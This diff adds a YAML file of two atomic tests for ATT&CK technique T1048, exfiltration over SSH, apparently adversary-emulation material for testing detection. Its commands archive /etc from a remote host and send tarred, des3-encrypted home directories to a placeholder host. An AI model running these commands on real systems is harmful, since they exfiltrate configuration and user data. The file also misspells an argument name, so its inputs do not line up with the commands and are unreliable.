@@ -1,0 +1,52 @@
+---
+attack_technique: T1048
+display_name: Exfiltration Over Alternative Protocol
+
+atomic_tests:
+- name: Exfiltration Over Alternative Protocol - SSH
+  description: |
+    Input a domain and test Exfiltration over SSH
+
+    Remote to Local
+
+  supported_platforms:
+    - macos
+    - centos
+    - ubuntu
+    - linux
+
+  input_arguments:
+    domain:
+      description: target SSH domain
+      type: url
+      default: target.example.com
+    user_name:
+      description: username for domain
+      type: string
+      default: atomic
+    passowrd:
+      description: password for user
+      type: string
+      default: atomic
+
+  executor:
+    name: sh
+    command: |
+      ssh ${domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
+
+- name: Exfiltration Over Alternative Protocol - SSH
+  description: |
+    Input a domain and test Exfiltration over SSH
+
+    Local to Remote
+
+  supported_platforms:
+    - macos
+    - centos
+    - ubuntu
+    - linux
+
+  executor:
+    name: sh
+    command: |
+      tar czpf - /Users/* | openssl des3 -salt -pass ${password} | ssh ${user_name}@${domain} 'cat > /Users.tar.gz.enc'
